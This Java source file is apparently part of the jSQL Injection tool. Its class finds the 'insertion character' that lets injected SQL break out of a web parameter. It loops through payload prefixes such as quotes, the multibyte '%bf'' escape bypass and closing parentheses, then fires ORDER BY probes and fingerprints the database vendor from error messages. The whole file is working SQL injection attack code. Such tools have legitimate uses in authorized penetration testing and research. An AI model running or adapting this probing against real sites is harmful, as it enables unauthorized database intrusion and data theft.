package com.jsql.model.suspendable;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import org.apache.commons.lang3.RandomStringUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.strategy.blind.InjectionCharInsertion;
import com.jsql.model.injection.vendor.model.Vendor;
import com.jsql.model.suspendable.callable.CallablePageSource;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
import com.jsql.util.I18nUtil;

/**
 * Runnable class, define insertionCharacter to be used during injection,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc.
 * Find working insertion char when error message occurs in source.
 * Force to 1 if no insertion char works and empty value from user,
 * Force to user's value if no insertion char works,
 * Force to insertion char otherwise.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
    
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    public SuspendableGetCharInsertion(InjectionModel injectionModel) {
        super(injectionModel);
    }

    @Override
    public String run(Object... args) throws JSqlException {
        
        String characterInsertionByUser = (String) args[0];

        ExecutorService taskExecutor;
        
        if (this.injectionModel.getMediatorUtils().getPreferencesUtil().isLimitingThreads()) {
            
            int countThreads = this.injectionModel.getMediatorUtils().getPreferencesUtil().countLimitingThreads();
            taskExecutor = Executors.newFixedThreadPool(countThreads, new ThreadFactoryCallable("CallableGetInsertionCharacter"));
            
        } else {
            
            taskExecutor = Executors.newCachedThreadPool(new ThreadFactoryCallable("CallableGetInsertionCharacter"));
        }
        
        CompletionService<CallablePageSource> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        String[] charFromBooleanMatch = new String[1];
        
        List<String> charactersInsertion = this.initializeCallables(taskCompletionService, characterInsertionByUser, charFromBooleanMatch);

        LOGGER.trace("Fingerprinting database and character insertion with Order by match...");

        String charFromOrderBy = null;
        
        int total = charactersInsertion.size();
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserSlidingException();
            }
            
            try {
                CallablePageSource currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                List<Vendor> vendorsOrderByMatch =
                    this.injectionModel
                    .getMediatorVendor()
                    .getVendors()
                    .stream()
                    .filter(vendor -> vendor != this.injectionModel.getMediatorVendor().getAuto())
                    .filter(vendor ->
                        StringUtils
                        .isNotEmpty(
                            vendor
                            .instance()
                            .getModelYaml()
                            .getStrategy()
                            .getConfiguration()
                            .getFingerprint()
                            .getOrderByErrorMessage()
                        )
                    )
                    .filter(vendor -> {
                        
                        Optional<String> optionalOrderByErrorMatch =
                            Stream.of(
                                vendor
                                .instance()
                                .getModelYaml()
                                .getStrategy()
                                .getConfiguration()
                                .getFingerprint()
                                .getOrderByErrorMessage()
                                .split("[\\r\\n]{1,}")
                            )
                            .filter(errorMessage -> Pattern.compile(".*" + errorMessage + ".*", Pattern.DOTALL).matcher(pageSource).matches())
                            .findAny();
                        
                        if (optionalOrderByErrorMatch.isPresent()) {
                            
                            LOGGER.info("Possibly [" + vendor + "] from Order by match");
                        }
                        
                        return optionalOrderByErrorMatch.isPresent();
                    })
                    .collect(Collectors.toList());
                
                if (!vendorsOrderByMatch.isEmpty()) {
                    
                    // Vendor
                    if (vendorsOrderByMatch.size() == 1 && vendorsOrderByMatch.get(0) != this.injectionModel.getMediatorVendor().getVendor()) {
                        
                        this.injectionModel.getMediatorVendor().setVendor(vendorsOrderByMatch.get(0));
                        
                    } else if (vendorsOrderByMatch.size() > 1) {
                        
                        if (vendorsOrderByMatch.contains(this.injectionModel.getMediatorVendor().getPostgreSQL())) {
                            
                            this.injectionModel.getMediatorVendor().setVendor(this.injectionModel.getMediatorVendor().getPostgreSQL());
                            
                        } else if (vendorsOrderByMatch.contains(this.injectionModel.getMediatorVendor().getMySQL())) {
                            
                            this.injectionModel.getMediatorVendor().setVendor(this.injectionModel.getMediatorVendor().getMySQL());
                            
                        } else {
                            
                            this.injectionModel.getMediatorVendor().setVendor(vendorsOrderByMatch.get(0));
                        }
                    }
                    
                    LOGGER.info("Using ["+ this.injectionModel.getMediatorVendor().getVendor() +"]");
                    Request requestSetVendor = new Request();
                    requestSetVendor.setMessage(Interaction.SET_VENDOR);
                    requestSetVendor.setParameters(this.injectionModel.getMediatorVendor().getVendor());
                    this.injectionModel.sendToViews(requestSetVendor);
                    
                    
                    // Char insertion
                    charFromOrderBy = currentCallable.getCharacterInsertion();
                    
                    if (charFromOrderBy.equals(charFromBooleanMatch[0])) {
                    
                        LOGGER.info("Confirmed character insertion ["+ charFromOrderBy +"] using Order by match");

                    } else {
                        
                        LOGGER.info("Found character insertion ["+ charFromOrderBy +"] using Order by match");
                    }
                    
                    break;
                    
                }
            } catch (InterruptedException | ExecutionException e) {
                
                LOGGER.error("Interruption while defining character injection", e);
                Thread.currentThread().interrupt();
            }
        }
        
        // End the job
        try {
            taskExecutor.shutdown();
            if (!taskExecutor.awaitTermination(15, TimeUnit.SECONDS)) {
                taskExecutor.shutdownNow();
            }
            
        } catch (InterruptedException e) {
            
            LOGGER.error(e.getMessage(), e);
            Thread.currentThread().interrupt();
        }
        
        if (charFromOrderBy == null && charFromBooleanMatch[0] != null) {
            
            charFromOrderBy = charFromBooleanMatch[0];
        }
        
        return this.getCharacterInsertion(characterInsertionByUser, charFromOrderBy);
    }

    private List<String> initializeCallables(CompletionService<CallablePageSource> taskCompletionService, String characterInsertionByUser, String[] charFromBooleanMatch) throws JSqlException {
        
        List<String> roots =
            Arrays.asList(
                "" + RandomStringUtils.random(10, "012"),
                "-1",
                "1",
                characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY),
                StringUtils.EMPTY
            );
        
        List<String> prefixes =
            Arrays
            .asList(
                "prefix",
                "prefix'",
                "prefix\"",
                "prefix%bf'"
//                "prefix`",
//                "'prefix'"
//                "`prefix`",
//                "\"prefix\"",
            );
        
        List<String> suffixes = Arrays.asList(StringUtils.EMPTY, ")", "))");
        
        List<String> charactersInsertion = new ArrayList<>();
        
        LOGGER.trace("Fingerprinting character insertion with Boolean match...");
        for (String root: roots) {
            
            for (String prefix: prefixes) {
                
                for (String suffix: suffixes) {
                    
                    charactersInsertion.add(prefix.replace("prefix", root) + suffix);
                    
                    // Skipping Boolean match when already found
                    if (charFromBooleanMatch[0] == null) {
                        
                        InjectionCharInsertion injectionCharInsertion = new InjectionCharInsertion(
                            this.injectionModel,
                            prefix.replace("prefix", root) + suffix
                            ,
                            prefix + suffix
                        );
                        if (injectionCharInsertion.isInjectable()) {
    
                            if (this.isSuspended()) {
                                throw new StoppedByUserSlidingException();
                            }
                            
                            charFromBooleanMatch[0] = prefix.replace("prefix", root) + suffix;
                            LOGGER.info("Found character insertion ["+ charFromBooleanMatch[0] +"] using Boolean match");
                        }
                    }
                }
            }
        }
        
        for (String characterInsertion: charactersInsertion) {
            
            taskCompletionService.submit(
                new CallablePageSource(
                    characterInsertion
                    + StringUtils.SPACE
                    + this.injectionModel.getMediatorVendor().getVendor().instance().sqlOrderBy(),
                    characterInsertion,
                    this.injectionModel,
                    "char:order-by"
                )
            );
        }
        
        return charactersInsertion;
    }
    
    private String getCharacterInsertion(String characterInsertionByUser, String characterInsertionDetected) {
        
        String characterInsertionDetectedFixed = characterInsertionDetected;
        
        if (characterInsertionDetectedFixed == null) {
            
            if (StringUtils.isEmpty(characterInsertionByUser) || InjectionModel.STAR.equals(characterInsertionByUser)) {
                
                characterInsertionDetectedFixed = "1";
                
            } else {
                
                characterInsertionDetectedFixed = characterInsertionByUser;
            }
            
            LOGGER.warn("No character insertion found, forcing to ["+ characterInsertionDetectedFixed.replace(InjectionModel.STAR, StringUtils.EMPTY) +"]");
            
        } else if (!characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY).equals(characterInsertionDetectedFixed)) {
            
            String characterInsertionByUserFormat = characterInsertionByUser.replace(InjectionModel.STAR, StringUtils.EMPTY);
            LOGGER.trace("Using ["+ this.injectionModel.getMediatorVendor().getVendor() +"] and ["+ characterInsertionDetectedFixed +"]");
            LOGGER.trace("Add manually the character * like ["+ characterInsertionByUserFormat +"*] to force the value ["+ characterInsertionByUserFormat +"]");
            
        } else {
            
            LOGGER.info(
                I18nUtil.valueByKey("LOG_USING_INSERTION_CHARACTER")
                + " ["
                + characterInsertionDetectedFixed.replace(InjectionModel.STAR, StringUtils.EMPTY)
                + "]"
            );
        }
        
        // Encoded space required for integer insertion
        // Fail on neo4j when plain space ' '
        return characterInsertionDetectedFixed.replace(InjectionModel.STAR, "+" + InjectionModel.STAR);
    }
}